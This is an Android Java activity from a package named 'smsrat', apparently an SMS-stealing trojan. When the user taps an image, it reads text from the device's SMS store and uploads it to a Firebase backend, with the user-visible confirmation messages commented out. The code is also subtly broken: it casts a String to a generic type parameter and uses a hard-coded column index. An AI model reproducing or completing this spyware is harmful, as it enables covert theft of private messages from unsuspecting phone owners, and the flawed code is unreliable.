package com.iamsahil.smsrat;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
public class home<ss> extends AppCompatActivity {


    ImageView img;
    ss ss;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        img = findViewById(R.id.img);

        img.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null,null,null,null);
                cursor.moveToFirst();
                ss = (ss) cursor.getString(12); //getting sms
                DAOsms dao = new DAOsms();
                sms sms = new sms((ss).toString()); //uploading to firebase
                dao.add(sms).addOnSuccessListener(suc ->
                {
                    // Toast.makeText(this, "welcome bsdk", Toast.LENGTH_SHORT).show();
                }).addOnFailureListener(er ->
                {
                    // Toast.makeText(this, " "+er.getMessage(), Toast.LENGTH_SHORT).show();

                });


            }
        });



    }
}